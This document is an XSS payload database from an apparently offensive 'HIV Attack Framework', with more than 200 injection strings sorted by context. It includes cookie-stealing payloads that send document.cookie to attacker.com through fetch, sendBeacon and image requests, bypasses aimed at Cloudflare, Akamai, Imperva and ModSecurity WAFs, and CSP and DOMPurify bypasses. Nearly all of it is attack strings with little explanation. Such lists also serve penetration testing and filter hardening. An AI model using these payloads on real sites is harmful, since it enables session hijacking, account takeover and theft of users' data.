# XSS Payload Database — HIV Attack Framework

> 200+ functional XSS payloads for authorized security research. Organized by context, delivery, WAF, and filter bypass.

---

## 1. HTML Body Context

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1) src=javascript:void(0)>
<iframe src=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<link rel=import href=javascript:alert(1)>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>CLICK
<table background=javascript:alert(1)>
<div style="background:url(javascript:alert(1))">
<xss id=x tabindex=1 onfocusin=alert(1)></xss>
```

---

## 2. HTML Attribute Context

```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onclick="alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
' onmouseover='alert(1)
' onclick='alert(1)
' autofocus onfocus='alert(1)
`onmouseover=alert(1)
javascript:alert(1)
data:text/html,<script>alert(1)</script>
" style="animation-name:x" onanimationstart="alert(1)
" style="animation-duration:1s;animation-name:x" onanimationstart="alert(1)
" onpointerover="alert(1)
" onpointerenter="alert(1)
" onauxclick="alert(1)
```

---

## 3. JavaScript String Context

```javascript
'-alert(1)-'
\'-alert(1)//
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
"-alert(1)-"
\"-alert(1)//
";alert(1)//
\";alert(1)//
${alert(1)}
`${alert(1)}`
\u0027-alert(1)-\u0027
\x27-alert(1)-\x27
&apos;-alert(1)-&apos;
```

---

## 4. JavaScript Code Context (no quotes needed)

```javascript
alert(1)
alert`1`
alert(document.domain)
alert(document.cookie)
eval("alert(1)")
setTimeout("alert(1)",0)
setInterval("alert(1)",9999)
Function("alert(1)")()
[].constructor.constructor("alert(1)")()
(()=>alert(1))()
{alert(1)}
throw alert(1)
void alert(1)
typeof(alert(1))
```

---

## 5. URL Context

```
javascript:alert(1)
javascript:alert(document.cookie)
javascript://comment%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:alert(1)
JaVaScRiPt:alert(1)
jaVAscript:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
java%0ascript:alert(1)
java%09script:alert(1)
java&#x0a;script:alert(1)
java&#x09;script:alert(1)
&#0000106avascript:alert(1)
```

---

## 6. CSS Context

```css
expression(alert(1))
</style><script>alert(1)</script>
</style><img src=x onerror=alert(1)>
{background:url("javascript:alert(1)")}
{-moz-binding:url("http://attacker/xss.xml#xss")}
@import "javascript:alert(1)";
```

---

## 7. JSON Context

```json
{"key":"</script><script>alert(1)</script>"}
{"key":"\u003cscript\u003ealert(1)\u003c/script\u003e"}
{"key":"<img src=x onerror=alert(1)>"}
{"callback":"alert","data":"1"}
{"key":"javascript:alert(1)"}
```

---

## 8. SVG Context

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<svg><script>alert(1)</script></svg>
<svg><script xlink:href=data:,alert(1) />
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?"><circle r="400"/><animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&">
<svg width="100%" height="100%"><rect width="100%" height="100%" onclick="alert(1)"/>Click me
```

---

## 9. Template Literal Context

```javascript
${alert(1)}
${"alert(1)".replace(/a/,eval)}
${(x=>{throw x})(alert(1))}
${[].map.call([1],alert)}
${document.write`<img src=x onerror=alert\`1\`>`}
```

---

## 10. Reflected XSS

```html
<script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><svg onload=alert(1)>
```

---

## 11. Stored XSS

```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<svg onload="document.location='https://attacker.com/?c='+document.cookie">
<body onpageshow="fetch('https://attacker.com/?c='+btoa(document.cookie))">
<iframe src="javascript:document.write('<script>fetch(\'https://attacker.com/?c=\'+document.cookie)<\/script>')">
<script>new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)</script>
<script>navigator.sendBeacon('https://attacker.com/',document.cookie)</script>
```

---

## 12. DOM-Based XSS

```javascript
// location.hash sinks
#<script>alert(1)</script>
#<img src=x onerror=alert(1)>
#javascript:alert(1)

// document.write sink
document.write('<img src=x onerror=alert(1)>')

// innerHTML sink
element.innerHTML = '<img src=x onerror=alert(1)>'

// eval sink
eval(location.hash.slice(1))

// jQuery .html() sink
$(element).html('<img src=x onerror=alert(1)>')
```

---

## 13. Mutation XSS (mXSS)

```html
<!-- These mutate when parsed by innerHTML -->
<listing><img src=x onerror=alert(1)></listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
<table><td background="javascript:alert(1)">
<math><mtext></table><img src=x onerror=alert(1)>
```

---

## 14. WAF Bypass — Cloudflare

```html
<!-- Cloudflare specific bypasses -->
<svg/onload=alert(1)>
<svg onload=alert(1)//
<img src=x onerror=alert(1)//
<img src=x onerror="alert(1)"//
<script>alert(1)/\*</script>
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<img src onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>
<!-- Cloudflare evasion: split token -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- Use event handlers Cloudflare doesn't check -->
<form id=x></form><button form=x formaction=javascript:alert(1)>click
<math><mi xlink:href="data:x,<script>alert(1)</script>">
```

---

## 15. WAF Bypass — Akamai

```html
<svg onload=alert(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<!-- Akamai misses these event handlers -->
<body onpointerrawupdate=alert(1)>
<div onpointerover=alert(1)>
<div onpointerenter=alert(1)>
<div onpointermove=alert(1)>
<!-- Case variations -->
<IMG SRC=x ONERROR=alert(1)>
<SVG ONLOAD=alert(1)>
<!-- Null bytes (sometimes work in legacy configs) -->
<scr%00ipt>alert(1)</scr%00ipt>
<!-- Tab/newline in event attribute -->
<img src=x	onerror=alert(1)>
<img src=x
onerror=alert(1)>
```

---

## 16. WAF Bypass — Imperva (Incapsula)

```html
<!-- Imperva bypasses -->
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click</a>
<!-- Angle bracket encoded -->
%3Cscript%3Ealert(1)%3C/script%3E
<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
<!-- Unicode escape -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E
<!-- Decimal entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

---

## 17. WAF Bypass — ModSecurity (CRS)

```html
<!-- ModSecurity CRS bypasses -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=setTimeout('alert(1)')>
<!-- CRS misses these events in some configs -->
<body onhashchange=alert(1)><a href=#>click
<input type=hidden autofocus onfocus=alert(1)>
<!-- Charset confusion -->
<!-- Request with charset=IBM037 and payload in EBCDIC -->
```

---

## 18. Filter Bypass — No Script Tag

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<link rel=stylesheet href=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<form action=javascript:alert(1)><input type=submit>
<button onclick=alert(1)>click
<a href=javascript:alert(1)>click</a>
<math href=javascript:alert(1)>click</math>
```

---

## 19. Filter Bypass — No alert()

```javascript
confirm(1)
prompt(1)
console.log(1)
print()
window.onerror=confirm;throw 1
onerror=confirm;throw 1
top.onerror=confirm;throw 1
document.location='https://attacker.com/?c='+document.cookie
new Image().src='https://attacker.com/?c='+document.cookie
fetch('https://attacker.com/?c='+document.cookie)
navigator.sendBeacon('https://attacker.com/',document.cookie)
eval('alert(1)')
Function('alert(1)')()
setTimeout('alert(1)',0)
setInterval('alert(1)',0)
[]['filter']['constructor']('alert(1)')()
```

---

## 20. Filter Bypass — No Parentheses

```javascript
alert`1`
alert`document.domain`
onerror=alert;throw 1
onerror=eval;throw'=alert\x281\x29'
document.write`XSS`
location=`javascript:alert\`1\``
{onerror=alert}throw 1
<img src=x onerror="window.onerror=alert;throw 1">
<script>onerror=alert;throw 1337</script>
```

---

## 21. Filter Bypass — No Quotes

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(document.cookie)>
<a href=javascript:alert(1)>x</a>
<script>alert(1)</script>
<!-- No quotes needed in these contexts -->
```

---

## 22. Filter Bypass — No Spaces

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<a/href=javascript:alert(1)>x</a>
<img	src=x	onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0csrc=x%0conerror=alert(1)>
```

---

## 23. Polyglot Payloads (Multi-Context)

```javascript
// Works in HTML, attribute, JS string contexts:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Works in href, src, action:
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

// Works in HTML and JS contexts:
'"><img src=x onerror=alert(document.domain)>

// Polyglot for innerHTML and eval:
\"><img src=x onerror=alert(1)><!--

// Multi-context polyglot:
</script><script>alert(1)</script>

// Universal polyglot (works across HTML, attribute, JS):
"><!--><script>alert(1)</script>
```

---

## 24. CSP Bypass — by Policy Type

```javascript
// CSP: script-src 'self'
// Bypass via JSONP endpoint:
<script src="https://target.com/api/jsonp?callback=alert(1)//"></script>
// Bypass via open redirect to script:
<script src="https://target.com/redirect?url=https://attacker.com/xss.js"></script>

// CSP: script-src 'nonce-xxxx'
// Bypass via DOM clobbering + nonce reuse:
<object data="data:text/html,<script nonce=xxxx>alert(1)</script>">
// Bypass via base-uri injection:
<base href="https://attacker.com/">

// CSP: script-src 'unsafe-inline'
// No bypass needed — inline scripts work:
<script>alert(1)</script>

// CSP: script-src cdn.example.com
// Bypass via cdn subdomain with JSONP:
<script src="https://cdn.example.com/angular.js"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

// CSP: default-src 'none'
// Still exploitable via:
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
// Or iframe with data URI:
<iframe src="data:text/html,<script>parent.alert(1)</script>">

// CSP: script-src 'strict-dynamic'
// Bypass via trusted script that eval()s attacker input
// Or via DOM sink in trusted module

// CSP with report-uri only (no enforcement):
// No bypass needed — all scripts execute
```

---

## 25. Bonus: Exotic / Edge Case Payloads

```html
<!-- innerHTML via Trusted Types bypass -->
<script>
const policy = trustedTypes.createPolicy('default', {createHTML: s => s});
document.body.innerHTML = policy.createHTML('<img src=x onerror=alert(1)>');
</script>

<!-- XSS via CSS animation -->
<style>@keyframes x{}</style>
<p style="animation-name:x" onanimationstart="alert(1)"></p>

<!-- XSS via drag and drop -->
<a href="http://attacker.com" draggable="true" ondragstart="alert(document.cookie)">Drag me</a>

<!-- XSS in XML/RSS feed -->
<rss><channel><title><![CDATA[</title><script>alert(1)</script>]]></title></channel></rss>

<!-- mXSS via DOMPurify bypass patterns (versions < 3.0.6) -->
<math><mtext><table><mglyph><style></table><img title=</style><img src onerror=alert(1)>

<!-- XSS via prototype pollution -->
<!-- If Object.prototype.innerHTML is polluted: -->
<!-- attacker sets __proto__[innerHTML] = <img src=x onerror=alert(1)> -->
<!-- Then any obj.innerHTML access triggers XSS -->

<!-- XSS via postMessage -->
window.addEventListener('message', (e) => {
  document.getElementById('output').innerHTML = e.data;  // sink
});
// Attacker sends: targetWindow.postMessage('<img src=x onerror=alert(1)>', '*')

<!-- XSS via Schemeless URL -->
//<svg onload=alert(1)>
////attacker.com/xss

<!-- XSS via window.name -->
<script>eval(name)</script>  <!-- window.name set by opener -->
```

---

*HIV Framework v2.0 — XSS Payload Database | 200+ payloads | Authorized research only*
